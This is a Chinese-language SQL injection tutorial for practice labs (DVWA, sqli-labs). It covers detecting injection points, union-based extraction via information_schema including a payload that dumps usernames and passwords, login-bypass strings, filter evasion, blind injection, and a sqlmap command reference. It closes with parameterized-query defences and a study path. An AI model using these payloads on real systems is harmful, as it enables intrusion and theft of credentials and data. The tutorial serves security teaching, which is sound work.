# SQL 注入进阶手册（从万能密码到 union 拖库）

> 只打自己的靶场（DVWA、sqli-labs）。对真实系统用下面的任何东西都是犯罪。

## 0. 一句话总纲

SQL 注入 = 程序把用户输入**拼进 SQL 语句**执行。你学会的所有技巧，本质都是：**截断原语句 + 补上自己的语句 + 处理掉尾巴**。

## 1. 判断有没有注入点

依次试（每步观察页面变化）：

1. 输入 `'` → 页面报错/变化 = 大概率有注入
2. `' and 1=1-- ` → 页面正常（条件真）
3. `' and 1=2-- ` → 页面异常（条件假）

第 2、3 步一个正常一个异常 = **确认注入**。
（`-- ` 是注释符，把后面的尾巴注释掉；注意 `--` 后面要带空格）

## 2. 猜列数（union 前必须）

```
' order by 1--   正常
' order by 2--   正常
' order by 3--   正常
' order by 4--   报错  ← 说明只有 3 列
```

原理：order by 按第 N 列排序，N 超出列数就报错。二分法找。

## 3. Union 注入四步拖库

假设查出来 3 列：

1. **找显示位**：`' union select 1,2,3-- ` → 看页面把 1、2、3 里哪个显示出来（比如显示 2，那 2 号位就是你的"窗口"）
2. **爆库名**：`' union select 1,database(),3-- ` → 显示当前库名
3. **爆表名**：
```
' union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1--
```
（limit 0,1 / 1,1 / 2,1……挨个翻）
4. **爆列名 + 拖数据**：
```
' union select 1,column_name,3 from information_schema.columns where table_name='users' limit 0,1--
' union select user,password,3 from users--
```

`information_schema` 是 MySQL 自带的"户口本"，所有库表列都登记在里面——注入要什么，都从它查。

## 4. 注释符和变体

- MySQL：`-- `（带空格）或 `#`
- 万能密码变体：`' or 1=1#`、`' or '1'='1`、`admin'-- `
- 空格被过滤时：用 `/**/` 代替空格，如 `'/**/union/**/select/**/1,2,3-- `

## 5. 盲注（页面不显示数据时）

**布尔盲注**（有变化，不显示内容）：
```
' and length(database())>5--   正常 → 库名超过 5 个字符
' and substr(database(),1,1)='a'--   逐位猜库名
```
**时间盲注**（完全没变化）：
```
' and sleep(5)--   页面 5 秒才回来 = 条件成立
```
盲注逐字符猜，慢但一定能猜完——所以盲注一般交给工具跑。

## 6. sqlmap 速查

```
sqlmap -u "URL?id=1" --cookie="security=low; PHPSESSID=xxx"   # 基础检测
sqlmap -u "URL?id=1" --cookie="..." --dbs                      # 列库
sqlmap -u "URL?id=1" --cookie="..." -D 库名 --tables           # 列表
sqlmap -u "URL?id=1" --cookie="..." -D 库名 -T 表名 --columns  # 列字段
sqlmap -u "URL?id=1" --cookie="..." -D 库名 -T 表名 --dump     # 拖数据
--batch      # 全程默认选项，不提问
--level 3 --risk 2   # 加大探测力度（必要时）
```

## 7. 防御（面试必考，抄下来）

**唯一正解：参数化查询。** 其他都是补充。

Python + sqlite3：
```python
cursor.execute("SELECT * FROM users WHERE name=?", (name,))
```
Python + pymysql：
```python
cursor.execute("SELECT * FROM users WHERE name=%s", (name,))
```

为什么能防：参数和 SQL 结构**分开发送**，输入永远只当"数据"，当不了"代码"。

补充三道防线：
1. 最小权限：Web 应用的数据库账号只给 SELECT/INSERT，不给 DROP
2. 报错不外显：线上环境关掉 SQL 报错回显
3. 白名单：id 这种参数，先校验"必须是数字"

## 8. 练习路径

1. DVWA SQL Injection：Low → Medium → High（看过滤了什么）
2. sqli-labs：第 1–10 关（union 系列全在这），然后 11–22 关（登录绕过/盲注）
3. 每关流程固定：手注成功 → 复述原理 → 再上 sqlmap → 对比两者结果

**完成标准**：sqli-labs 前 10 关能手注通关，且不看笔记能默写"order by 猜列数 → union 找显示位 → information_schema 拖库"这条链。
